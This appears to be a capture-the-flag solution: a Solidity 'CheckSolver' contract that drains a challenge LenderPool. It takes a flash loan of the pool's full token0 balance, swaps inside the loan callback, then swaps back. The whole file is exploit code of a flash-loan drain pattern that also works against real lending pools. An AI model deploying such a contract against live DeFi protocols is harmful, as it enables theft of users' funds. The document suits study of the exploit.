// SPDX-License-Identifier: MIT

import {LenderPool, IERC20} from "./Re.sol";

contract CheckSolver {
    LenderPool public pool;
    IERC20 public token0;
    IERC20 public token1;

    constructor(address pool_) {
        pool = LenderPool(pool_);
        token0 = pool.token0();
        token1 = pool.token1();
        token0.approve(address(pool), type(uint256).max);
        token1.approve(address(pool), type(uint256).max);
    }

    function solve() public {
        pool.flashLoan(token0.balanceOf(address(pool)), address(this));
        pool.swap(address(token0), token1.balanceOf(address(this)));
    }

    function receiveEther(uint256 amount) external {
        pool.swap(address(token1), amount);
    }
}
